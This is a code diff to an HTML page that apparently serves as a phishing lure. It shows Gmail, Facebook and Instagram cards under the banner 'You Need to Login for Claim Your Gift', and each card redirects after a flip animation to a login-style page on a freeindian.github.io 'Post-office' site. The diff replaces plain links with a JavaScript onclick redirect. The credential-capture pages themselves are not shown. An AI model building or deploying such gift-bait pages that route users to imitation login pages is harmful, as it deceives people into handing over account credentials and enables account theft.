@@ -153,39 +153,47 @@
 </head>
 
 <body>
-    <!-- Gmail Card with Link -->
-    <a href="https://freeindian.github.io/Post-office/Gmail" target="_blank">
-        <div class="cardBox">
-            <div class="card gmail">
-                <div class="card-front"><i class="fas fa-envelope"></i></div>
-                <div class="card-back">Gmail</div>
-            </div>
+    <!-- Gmail Card with Click Event -->
+    <div class="cardBox" onclick="flipAndRedirect(this, 'https://freeindian.github.io/Post-office/Gmail')">
+        <div class="card gmail">
+            <div class="card-front"><i class="fas fa-envelope"></i></div>
+            <div class="card-back">Gmail</div>
         </div>
-    </a>
+    </div>
     
-    <!-- Facebook Card with Link -->
-    <a href="https://freeindian.github.io/Post-office/login" target="_blank">
-        <div class="cardBox">
-            <div class="card facebook">
-                <div class="card-front"><i class="fab fa-facebook-f"></i></div>
-                <div class="card-back">Facebook</div>
-            </div>
+    <!-- Facebook Card with Click Event -->
+    <div class="cardBox" onclick="flipAndRedirect(this, 'https://freeindian.github.io/Post-office/login')">
+        <div class="card facebook">
+            <div class="card-front"><i class="fab fa-facebook-f"></i></div>
+            <div class="card-back">Facebook</div>
         </div>
-    </a>
+    </div>
     
-    <!-- Instagram Card with Link -->
-    <a href="https://freeindian.github.io/Post-office/instagram" target="_blank">
-        <div class="cardBox">
-            <div class="card instagram">
-                <div class="card-front"><i class="fab fa-instagram"></i></div>
-                <div class="card-back">Instagram</div>
-            </div>
+    <!-- Instagram Card with Click Event -->
+    <div class="cardBox" onclick="flipAndRedirect(this, 'https://freeindian.github.io/Post-office/instagram')">
+        <div class="card instagram">
+            <div class="card-front"><i class="fab fa-instagram"></i></div>
+            <div class="card-back">Instagram</div>
         </div>
-    </a>
+    </div>
 
     <!-- Gradient Animated Text -->
     <div class="gradient-text">
         You Need to Login for Claim Your Gift
     </div>
+
+    <script>
+        // Function to flip the card and redirect after 2 seconds
+        function flipAndRedirect(cardElement, url) {
+            // Add class to flip the card
+            cardElement.querySelector('.card').style.transform = 'rotateY(180deg)';
+
+            // Wait 2 seconds, then redirect to the URL
+            setTimeout(function() {
+                window.location.href = url;
+            }, 2000); // 2000 milliseconds = 2 seconds
+        }
+    </script>
 </body>
+
 </html>
